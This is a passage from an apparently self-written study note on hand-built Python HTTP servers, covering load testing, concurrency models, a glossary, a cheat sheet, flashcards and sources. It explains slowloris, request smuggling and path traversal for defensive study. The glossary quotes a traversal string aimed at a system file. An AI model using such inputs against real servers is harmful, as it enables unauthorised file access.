- **The threaded (pooled) server's throughput scales with concurrency up to the pool size, then flattens and queuing latency grows** — concept 4's 8-vs-10 measurement is this exact inflection point, in miniature; a full load test just needs to sweep across it more thoroughly to plot the curve.
- **The event-loop server's throughput should scale further than the threaded server's for this note's specific I/O-light workload** (`/api/time`, `/static/hello.txt` are both fast, non-blocking-in-effect operations), limited eventually by single-core Python execution speed (Day 20's GIL) rather than by connection count — the crossover concept 5's system design already named: this server has no thread-pool-sized ceiling on connection count, but it does have a single-core ceiling on total throughput that a multi-worker-process deployment (concept 5's Nginx-style system design) would need to address to use more than one core.
- **Nginx, serving the equivalent static file, should substantially outperform every server in this note** — by orders of magnitude on raw requests/second for static content, not a modest margin. This is expected, not embarrassing: Nginx's static-file path uses `sendfile()` (a system call that copies file data directly from the filesystem cache to the socket inside the kernel, with the file's bytes never even copied into Nginx's own process memory — a mechanism this note's `with open(...) as f: data = f.read()` deliberately does not use, since seeing the file bytes pass through Python is more instructive for a first build than the zero-copy path is), is written in C with two decades of performance tuning, and runs multiple worker processes across every core by default (concept 5's system design). **The honest, useful conclusion of running this comparison yourself is not "my Python server is bad" — it's "I can now point at exactly which mechanism (`sendfile`, compiled code, multi-process workers) accounts for each order of magnitude of the gap,"** because this note built a working, from-scratch model of every layer Nginx is optimizing.

### System design — designing the load-test methodology itself

**Problem.** You're asked to determine "which of our three home-grown server versions should we deploy, and at what concurrency does it need a Nginx reverse proxy in front of it to survive our expected traffic." Design the test.

**The decision.** Run the four-step methodology above against realistic traffic shapes for your *actual* expected workload (not just `/api/time` — include whatever mix of fast-JSON, static-file, and slow-handler requests matches production), at concurrency levels spanning at least one order of magnitude above your expected peak (if you expect 200 concurrent users, test to 2,000, because concept 4 and concept 6 both showed that the interesting failure behavior is specifically what happens *past* a server's comfortable ceiling, not at it), and capture the resource-usage metrics (thread count, fd count, memory) alongside latency and throughput, specifically so that when something degrades, you already know *which* of this note's mechanisms is responsible rather than needing to re-diagnose it under production pressure.

**The trade-off.** A thorough load test, run this way, takes real time and infrastructure (a separate load-generation machine, realistic traffic replay) to do properly — cutting corners (testing on the same machine, testing only one request shape, testing only one concurrency level) produces a result that looks like data but doesn't actually answer the question asked.

**The flip condition.** A quick, rough test (one tool invocation, one concurrency level, same machine) is genuinely fine for a first-pass sanity check early in development — "does this obviously fall over at 50 concurrent requests" doesn't need a rigorous methodology to answer. Move to the full methodology the moment the answer will actually inform a real capacity or architecture decision, because that's exactly when a misleading quick-test result becomes expensive.

### Case study — TechEmpower Web Framework Benchmarks

**What it is.** TechEmpower has run a large-scale, publicly reproducible benchmark comparing web frameworks and servers (across many languages, including numerous Python frameworks/server combinations spanning sync WSGI, async ASGI, and everything discussed in concepts 4/5/7) across standardized workloads (JSON serialization, single/multiple database queries, plaintext responses) since 2013, with results and full methodology published openly, including the actual source code for every framework's test implementation.

**The engineering lesson, tied to this concept.** TechEmpower's results consistently show exactly the architectural pattern this note derived from first principles: frameworks and server configurations built around an event-loop/async model dramatically outperform synchronous, thread-per-request configurations specifically on I/O-bound benchmarks with high concurrency (concept 5's territory), while the gap narrows or reverses on CPU-bound or low-concurrency workloads (concept 4's territory) — independent, large-scale, reproducible confirmation of the same trade-off this note built and measured by hand at a much smaller scale.

**Primary source.** TechEmpower Web Framework Benchmarks (`www.techempower.com/benchmarks`). *Verify current: this is one of the fastest-drifting sources cited in this entire note — rankings, specific frameworks tested, and round numbers change with every new round (currently numbered releases, roughly every year or two); treat any specific ranking as stale the moment you read it and check the current round before citing a number.*

### In production

**Best practices.** Benchmark your *actual* handler code and *actual* expected traffic shape, not a synthetic "hello world" endpoint — concept 5's system design already showed that the right architecture is workload-dependent, so a benchmark on the wrong workload shape actively misleads. Re-run load tests after any dependency upgrade (a new Python version, a new ASGI server release) rather than assuming past results still hold.

**Common mistakes.** Benchmarking on a developer laptop and extrapolating directly to production hardware with a different core count, different NUMA topology, or a shared/virtualized environment with noisy neighbors; benchmarking only the happy path and never including the slow/error-path requests that a production system inevitably serves a nontrivial fraction of the time.

---

# Topic-wide wrap-up

## Glossary

**Absolute deadline** — a timeout measured from connection or request start, independent of activity gaps, added specifically because an idle-only timeout can be defeated by a trickle paced just under its threshold (concept 6).

**Accept loop** — the core control-flow pattern of every server in this note: repeatedly call `accept()` on a listening socket and do something with each resulting connection; what varies across concepts 1, 4, and 5 is only what happens between one `accept()` call and the next.

**Blocking I/O** — a socket call (`recv`, `accept`, `connect`) that suspends the calling thread until it can complete, taking the thread off the CPU with zero busy-waiting (Day 5 §1.5); the default behavior every server in this note has to explicitly work around once more than one client must be served concurrently.

**C10K problem** — Dan Kegel's 1999 naming of the structural collapse of thread/process-per-connection servers once concurrent connections reach roughly ten thousand, driven by per-connection memory and context-switch cost rather than raw CPU or bandwidth (Day 3 §1.6; concept 4's case study).

**Chunked transfer-encoding** — an HTTP/1.1 body-framing mode (RFC 9112 §7.1) that sends a response in length-prefixed pieces terminated by a zero-length chunk, used when the total body size isn't known in advance; not implemented by any server in this note (concept 3).

**Connection header** — the HTTP header (`Connection: keep-alive` / `Connection: close`) that governs whether a connection persists after the current response (concept 2).

**Content-Length** — a header declaring the exact byte length of a message body, used by every server in this note (on both requests and responses) as the framing mechanism for bodies, as an alternative to chunked encoding (concepts 1–2).

**Event loop** — a single-threaded architecture that watches many sockets at once via a readiness-notification API (`select`/`epoll`, wrapped by Python's `selectors`) and dispatches work to whichever is ready, representing each idle connection with a small state object instead of a whole OS thread (Day 5 §1.6; concept 5).

**Framing** — the problem of determining where one HTTP message ends and the next begins within a continuous TCP byte stream, solved via a header terminator (`\r\n\r\n`) plus a declared body length (concept 1).

**Gunicorn worker class** — a configurable choice of concurrency architecture (`sync`, `gthread`, `gevent`/`eventlet`, an ASGI worker) that Gunicorn exposes per-deployment, each corresponding to one of this note's three hand-built models (concept 7).

**Idle-read timeout** — a timeout that resets on every byte received and fires only after a period of total silence; necessary but, alone, insufficient against slowloris-style trickling (concept 6).

**Iterative server** — a server that handles exactly one client fully, start to finish, before accepting the next; concept 1's baseline, and the architecture whose single-worker bottleneck motivates every subsequent concept.

**Keep-alive** — the HTTP/1.1 default behavior of reusing one TCP connection for multiple sequential request/response cycles rather than opening a new connection per request (concept 2).

**Little's Law** — `L = λ × W`, the queueing-theory relationship used to size a thread pool for a given arrival rate and per-request service time (Day 3 §1.7; applied to this note's thread pools in concept 4).

**Path traversal** — a vulnerability class where a client-supplied filesystem path (`../../etc/passwd`) escapes an intended directory unless the resolved path is checked for containment before use (concept 1).

**Readiness notification** — the general category of API (`select`, `poll`, `epoll`) that tells a caller which of many watched file descriptors currently have data ready, without the caller having to block on or poll each one individually (Day 5 §1.6; concept 5).

**Request smuggling** — an attack exploiting disagreement between a front-end proxy and a back-end server about where one HTTP request ends and the next begins, typically via conflicting `Content-Length`/`Transfer-Encoding` headers (concept 3's case study).

**Slowloris** — an attack technique (and the 2009 tool that popularized it) that opens many connections and sends partial HTTP requests, trickling additional bytes just often enough to defeat an idle-read timeout while never completing the request, exhausting a server's thread/process ceiling with minimal bandwidth (concept 6).

**Thread-per-connection** — an architecture that hands each accepted connection to its own OS thread (or a thread drawn from a bounded pool), allowing genuinely concurrent handling at the cost of one thread's worth of memory and scheduling overhead per connection (Day 3 §1.1, §1.6; concept 4).

## Cheat sheet

```
CONCURRENCY MODEL DECISION TABLE
  workload trait                     -> pick
  ---------------------------------------------------------------
  low traffic, simplicity matters    -> iterative (never in prod)
  CPU-bound (image resize, hashing)  -> thread-per-connection,
                                         pool size ~= core count
  I/O-bound, moderate concurrency    -> thread-per-connection,
                                         pool size = Little's Law
                                         (L = lambda x W)
  I/O-bound, HIGH concurrency,       -> event loop (selectors/
  many idle keep-alive/long-poll        epoll); Nginx-style
  connections                           multi-process for cores

FRAMING RULES (every server in this note)
  headers end at:      \r\n\r\n  (exactly this byte sequence)
  body length from:     Content-Length header (chunked NOT built here)
  response framing:     always send Content-Length (or chunked, not built)

KEEP-ALIVE DEFAULT TABLE
  HTTP/1.1, no Connection header  -> persistent (default)
  HTTP/1.0, no Connection header  -> NOT persistent (default)
  either version + Connection: close     -> closes
  HTTP/1.0 + Connection: keep-alive      -> persistent

ABUSE-PROTECTION CHECKLIST (concept 6)
  [ ] idle-read timeout            (defeats a silent client)
  [ ] absolute header/body deadline (defeats a paced trickle)
  [ ] max request/header size       (defeats a large-payload flood)
  [ ] connection cap                (bounds total commitment)

WHAT SURVIVES WHAT (this note's measured results)
                        1 slow client      N slowloris conns
  iterative             TOTAL outage       TOTAL outage (N=1 enough)
  threaded, pool=P      fine (1 thread)    outage once N >= P,
                                           refreshed faster than timeout
  event loop            fine (cheap state) fine up to fd limit,
                                           IF a timeout sweep exists;
                                           unbounded fd growth if not
```

## Build this

**Task.** Implement, run, and load-test the full ladder yourself, using the servers in this note as a reference, not a copy-paste target — retype them, so the framing loop and the state-machine logic actually go through your hands.

- [ ] Build the iterative server (concept 1): accept loop, request parsing off raw bytes, routing to a JSON endpoint and a static-file endpoint, with the path-traversal defense in place. Verify with `curl` against both endpoints and a 404 case.
- [ ] Reproduce concept 1's one-client-at-a-time proof: hold a connection open with no data, time a concurrent request, confirm it waits roughly as long as the hold.
- [ ] Add keep-alive (concept 2): loop `handle_client` instead of returning after one response; add the `Connection`/`Keep-Alive` header logic; verify with a multi-URL `curl` invocation that the server log shows more than one request on a single source port.
- [ ] Upgrade to thread-per-connection (concept 4), both the unbounded and the `ThreadPoolExecutor`-bounded variants. Fire N concurrent requests to a deliberately slow endpoint and confirm wall-clock time scales with `ceil(N / pool_size)`, not with `N`.
- [ ] Build the event-loop version (concept 5) with `selectors`. Reproduce the blocking-call proof: send a slow and a fast request back-to-back from one script and confirm the fast one waits for the slow one to finish.
- [ ] Add the idle-timeout sweep (concept 6) to the event-loop version. Open a batch of half-open connections, wait past the timeout, and confirm they were closed server-side.
- [ ] **The definition of done:** load-test all three finished architectures against the same workload at increasing concurrency (this note's concept 9 methodology), and — matching the study plan's exact instruction — also point the load test at a real Nginx instance serving the same static file (Day 16's setup) and **write down, in your own words, where each of your servers dies first and why**, in terms of the mechanisms this note built: an accept-queue pileup, a thread-pool queue depth climbing, a single-core CPU ceiling, or a file-descriptor exhaustion.

## Active recall and self-test

Answer from memory, in writing, before checking back against the note.

1. What is the exact byte sequence that marks the end of an HTTP request's headers, and why must the size-limit check in an incremental parser happen unconditionally rather than only when that sequence is absent?
2. Trace, step by step, why a `curl` request can take several seconds to complete against a perfectly healthy iterative server, with no error ever occurring.
3. State HTTP/1.1's and HTTP/1.0's default `Connection` behavior, and the one header value that overrides both.
4. Why does thread-per-connection's cost scale with *concurrently open connections* rather than *concurrently active requests*, once keep-alive is in the picture?
5. In this note's own measurements, five concurrent one-second requests took 5.181s on the iterative server and 1.389s on the pooled threaded server. Explain the ratio in terms of what each architecture's single unit of concurrency actually is.
6. What single line of code, inside a request handler, would turn the event-loop server's advantage into its exact opposite? Why?
7. Explain why an idle-read timeout alone does not defeat a slowloris-style attacker, and name the one mechanism that does.
8. In this note's own measurement, 8 slowloris connections against a pool of 8 threads delayed a legitimate request by almost exactly 5 seconds. Explain that number.
9. In this note's own measurement, 300 slowloris connections against an *untimed* event-loop server delayed a legitimate request by essentially zero. Explain why, and then explain the honest limit of that result.
10. Map each of Gunicorn's `sync`, `gthread`, and an ASGI worker onto one of this note's three hand-built architectures.
11. Name three specific things a real ASGI server does that none of this note's servers do.
12. Why would Nginx, serving the identical static file, be expected to outperform every server in this note by orders of magnitude — name at least two distinct mechanisms, not just "it's written in C."

### 60-second teach-back

> **"A listening socket only gives you bytes — everything that makes those bytes into a request and a reply is code you write yourself: find the `\r\n\r\n` that ends the headers, read exactly `Content-Length` more bytes for the body, then write back a response with its own length. The interesting question is what happens to every OTHER client while you're serving one: an iterative server makes everyone wait their turn, full stop, so one slow client is a total outage — I proved this by holding a connection open and watching an unrelated request wait six seconds for no reason. Give each connection its own thread and that goes away — five one-second requests ran in 1.4 seconds instead of 5 — but now every idle keep-alive connection permanently costs a whole OS thread, and that's exactly the C10K wall Day 3 already named. Watch every connection on ONE thread with epoll instead, and idle connections become almost free — 300 attacking connections cost an unarmed event loop nothing — but the moment any single handler does something slow or blocking, it freezes literally everyone sharing that thread, which I proved by sending a slow and a fast request together and watching the fast one wait a full second for no reason of its own. And none of these architectures defends itself: a client that trickles one byte every ten seconds defeats a plain idle timeout, which I proved by watching eight such connections fully occupy an eight-thread pool and delay a real request by exactly the timeout window — the actual fix needs an absolute deadline, a size cap, and a connection ceiling, layered together, not just one timer. Gunicorn's sync/gthread/async worker types are literally these same three architectures, in a config flag, and now I know which one to pick and why."**

If you can say that out loud, including the actual measured numbers, and then explain *why* the event loop's fd-exhaustion risk is real even though its thread-cost risk isn't — you have this topic.

## Spaced-repetition flashcards

| Q | A |
|---|---|
| What byte sequence ends an HTTP request's headers? | `\r\n\r\n` |
| Why check a size limit unconditionally, not just when the terminator is absent? | The chunk that completes the terminator can be the same chunk that exceeds the limit — checking only in the "no terminator" branch misses that case entirely (a real bug found while building concept 5) |
| HTTP/1.1 default `Connection` behavior with no header sent? | Persistent (keep-alive) by default |
| HTTP/1.0 default `Connection` behavior with no header sent? | NOT persistent — closes unless the client sends `Connection: keep-alive` |
| Why does one slow client freeze an entire iterative server? | One thread, one `accept()` loop — nothing else can be accepted until `handle_client` returns |
| What made 5 concurrent 1s requests take 1.389s on the threaded server but 5.181s on the iterative one? | Threaded gave each request its own OS thread (true parallelism); iterative served them one at a time on the single worker |
| What single mistake turns an event loop's advantage into its opposite? | Calling a blocking function (a synchronous DB call, `time.sleep`) directly inside a handler that runs on the loop's one thread |
| Why did 8 slowloris connections beat an 8-thread pool but 300 barely touch an event loop? | Each slowloris connection costs one OS thread under thread-per-connection, but only a few hundred bytes of state under an event loop |
| Why is an idle-read timeout alone insufficient against slowloris? | It resets on every byte received — a trickle paced just under the timeout interval never triggers it |
| What's the one mechanism that DOES defeat a well-paced trickle? | An absolute header/body deadline, measured from connection start regardless of activity gaps |
| Does an event loop with no timeout logic ever fail under a slowloris flood? | Yes — file descriptors are finite (`RLIMIT_NOFILE`); enough attacking connections eventually exhausts them even though each one is nearly free |
| Map Gunicorn's `sync` worker onto this note's models | Concept 1's iterative model, run as several OS processes in parallel |
| Map Gunicorn's `gthread` worker onto this note's models | Concept 4's thread-per-connection model |
| Map Gunicorn's async/ASGI worker onto this note's models | Concept 5's event-loop model, fully built out with real coroutines |
| Why is a hand-rolled HTTP parser a bad idea for public-facing production code? | HTTP/1.1's edge cases (RFC 9112) were mostly added *because* some real implementation got them wrong; a hand-rolled parser starts at zero hours of that hardening (Cloudbleed case study) |
| What causes HTTP request smuggling? | A front-end proxy and a back-end server disagreeing about `Content-Length` vs. `Transfer-Encoding` framing on the same request |
| Why does Nginx outperform a hand-rolled Python server on static files by orders of magnitude? | `sendfile()` (zero-copy kernel-level file-to-socket transfer), compiled C, and multiple worker processes across every core, by default |
| What does a real ASGI server do that this note's event loop doesn't? | Runs real `async`/`await` coroutines on `asyncio`/`uvloop`, auto-offloads sync `def` handlers to a thread pool, handles chunked encoding, TLS, graceful reload |

## Primary sources

**Core specifications**
- **RFC 9112** — HTTP/1.1 (Message Syntax and Routing) — request/response framing, `Content-Length`, `Transfer-Encoding`, chunked encoding (§7.1), the `Connection` header and persistence rules (§9.3), and the security considerations around conflicting length headers (§6.3, §11.2).
- **RFC 9110** — HTTP Semantics (methods, status codes — assumed already taught, Day 13).

**C10K and concurrency architecture**
- Dan Kegel, "The C10K problem" (kegel.com/c10k.html, 1999).
- Day 3 (`d3-os-threads-scheduling-races.md`) §1.1–1.9 — threads, races, deadlock, scheduling, context-switch cost, C10K, Little's Law, and the Apache-vs-Nginx case study, all reused directly rather than repeated here.
- Day 5 (`d5-os-files-io-descriptors.md`) §1.5–1.6 — blocking vs. non-blocking I/O, `select`/`poll`/`epoll`, and a runnable `selectors`-based server, reused directly rather than repeated here.

**Request smuggling**
- Linhart, Klein, Heled, Orrin, "HTTP Request Smuggling" (Watchfire, 2005).
- James Kettle, "HTTP Desync Attacks: Request Smuggling Reborn" (PortSwigger Research, 2019).

**Slowloris and related abuse**
- Robert Hansen ("RSnake"), original Slowloris release documentation (2009). *Verify current: original hosting has drifted; search current mirrors/archives.*
- Cloudflare Blog, "HTTP/2 Rapid Reset: deconstructing the record-breaking attack" (October 2023); CVE-2023-44487.

**Case studies**
- Cloudflare, "Incident report on memory leak caused by Cloudflare parser bug" (24 Feb 2017); Tavis Ormandy, Project Zero bug #1139.
- Redis documentation/FAQ, "Why is Redis single threaded..." *Verify current: Redis 6+ added optional multi-threaded I/O for network read/write specifically — check current docs for exactly what remains single-threaded.*
- Cloudflare Blog, "Details of the Cloudflare outage on July 2, 2019" (John Graham-Cumming).
- Gunicorn documentation, "Design" and "Settings" (`docs.gunicorn.org`). *Verify current: worker class names and defaults drift across versions.*
- Uvicorn documentation (`www.uvicorn.org`), "Deployment" and "Settings." *Verify current: recommended deployment pattern and the Gunicorn-worker-class package/import path have moved over time.*
- TechEmpower Web Framework Benchmarks (`www.techempower.com/benchmarks`). *Verify current: this is among the fastest-drifting sources in this note — check the current round before citing a ranking.*

## Layered explanations

**10 seconds.** An HTTP server is an accept loop plus a rule for finding the end of a request in a byte stream. What differs between architectures is what happens to every OTHER client while one is being served: one at a time (and one slow client is a total outage), one thread each (fast, but costly per idle connection), or all of them on one thread via `epoll` (cheap per connection, but one blocking call freezes everyone).

**1 minute.** Every server in this note reads bytes off a socket until it finds `\r\n\r\n`, reads `Content-Length` more bytes for the body, routes on method and path, and writes back a self-describing response. HTTP/1.1's keep-alive means one connection carries many requests, which is efficient but means idle connections, not just active requests, are what a server actually has to accommodate. The iterative model serves one client fully before accepting the next, so a single slow or malicious client is a complete outage — measured directly: an ordinary request waited nearly six seconds behind one connection that sent nothing. Thread-per-connection fixes that (five one-second requests ran in 1.4s instead of 5.2s) but costs a full OS thread per connection, which becomes ruinous once thousands of mostly-idle keep-alive connections exist simultaneously — Day 3's C10K wall. An event loop represents each connection as a few hundred bytes of state instead, watched by one thread via `epoll`/`selectors`, and survives connection-count attacks that would flatten a thread pool — but any single blocking call inside a handler freezes every other connection sharing that one thread, proven directly by timing a fast and a slow request sent together. Neither architecture defends itself against a determined attacker without deliberately added timeouts, and even an idle-read timeout alone is defeated by a client that trickles bytes just fast enough — slowloris's actual technique, which this note reproduced and measured against both a thread pool (it won, delaying real traffic by the exact timeout window) and an unarmed event loop (it lost, until file descriptors alone become the limit). Gunicorn's `sync`/`gthread`/async worker types are exactly these three architectures, offered as a configuration choice once you understand what each one actually is.

**5 minutes.** This note rebuilds, by hand, exactly what uvicorn, gunicorn, and Nginx do: turn a raw listening socket into something that behaves like an HTTP server. Framing is the first problem — TCP is a byte stream with no message boundaries, so the server must invent its own rule (`\r\n\r\n` ends headers; `Content-Length` bounds the body) and read incrementally until that rule is satisfied, never assuming one `recv()` call equals one request. Keep-alive then reuses one TCP connection for many requests, following RFC 9112's persistence defaults (HTTP/1.1 persistent by default, HTTP/1.0 not, either overridable via `Connection: close`), which avoids repeated handshake costs but means most connections spend most of their time idle rather than actively serving a request — a fact that reshapes every concurrency decision that follows. The iterative model — one client at a time, full stop — was measured directly to produce a total outage from a single unresponsive or malicious connection, because the single worker cannot even call `accept()` again until the current client is fully done. Thread-per-connection (Day 3's machinery, applied directly) fixes that by giving each connection real OS-level parallelism — measured at roughly 3.7x faster on five concurrent one-second requests — but each thread costs real, fixed memory and scheduling overhead regardless of how idle the connection is, which is exactly Day 3's C10K wall, sharpened by keep-alive turning "idle" into the dominant, not exceptional, connection state. An event loop (Day 5's `epoll`/`selectors` machinery, applied directly) inverts the trade: each connection costs a few hundred bytes of hand-tracked state instead of a thread, verified by surviving 300 simultaneous half-open connections that would have exhausted a small thread pool by a factor of nearly 40 — but the loop has exactly one thread, so any handler that blocks (a slow synchronous call, or literally `time.sleep`, proven with a precise two-request timing test) freezes every other connection sharing it, a failure this note's own test server actually hit as an unhandled-exception crash while being built, underscoring that a single-threaded architecture has zero fault isolation between unrelated connections. No architecture defends itself against abuse for free: a plain idle-read timeout is necessary but insufficient, because a slowloris-style attacker paces trickled bytes just under the timeout threshold — measured directly to fully occupy an eight-thread pool with only eight attacking connections, while the same attack barely registered against an event loop with no timeout logic at all, honestly caveated by the fact that the event loop's real limit simply moves to file-descriptor exhaustion rather than disappearing. A complete defense layers four independent mechanisms — idle timeout, absolute deadline, size cap, connection cap — because each closes a gap the others leave open. Gunicorn's real, documented worker-class menu (`sync`, `gthread`, `gevent`/`eventlet`, ASGI workers) turns out to be exactly these three architectures offered as a per-deployment configuration choice, and a real ASGI server like Uvicorn is the fully-hardened version of this note's event loop, with a battle-tested parser, chunked encoding, real coroutines, and automatic thread-pool offloading for synchronous code — every one of which was named here as a specific, honest gap rather than glossed over.

**Expert summary.** The entire design space explored today reduces to a single resource-allocation question — what unit of cost represents one connection's "waiting" state — and every architectural and security property in this note follows from the answer. Thread-per-connection allocates a full preemptively-scheduled kernel entity (an 8MB reserved stack, a scheduler slot, a context-switch's worth of register state) per connection regardless of that connection's actual activity level, which yields perfect fault isolation and trivial reasoning about concurrent handler code at the cost of a fixed per-connection overhead that dominates once connection count, not request rate, becomes the binding constraint — precisely the regime HTTP/1.1 keep-alive creates by design. An event loop allocates a few hundred bytes of cooperatively-scheduled application-level state per connection instead, achieving near-zero marginal cost for idle connections at the structural price of eliminating fault isolation between concurrently-handled connections entirely — a single unhandled exception or blocking call is fatal to, or stalls, the shared execution context for every connection on that loop, which is why production event-driven architectures (Nginx's multi-worker-process model) reintroduce process-level isolation as an orthogonal axis rather than accepting the single-loop failure domain directly. Every abuse-resistance property is a direct corollary of which resource a given timeout mechanism actually bounds: an idle-read timer bounds elapsed time since last activity and is therefore invariant to, and defeated by, any attacker willing to respect that specific invariant while violating its intent; only a timer bounding total elapsed time independent of activity closes that gap, and even then, the underlying finite resource (threads under thread-per-connection, file descriptors under an event loop) sets the actual ceiling no timeout policy can raise. The historical trajectory from thread-per-connection through the C10K reckoning to event-driven architecture, and the subsequent re-introduction of coroutine-based concurrency to recover ordinary sequential control flow without paying the thread-per-connection tax, is not a sequence of increasingly sophisticated ideas replacing naive ones — it is the same fault-isolation-versus-per-connection-cost trade-off being renegotiated at successive layers of abstraction, each layer's production hardening (a real HTTP parser, a real coroutine scheduler, multi-process worker supervision) existing specifically to close a gap this note's own from-scratch build left open and named explicitly.

---






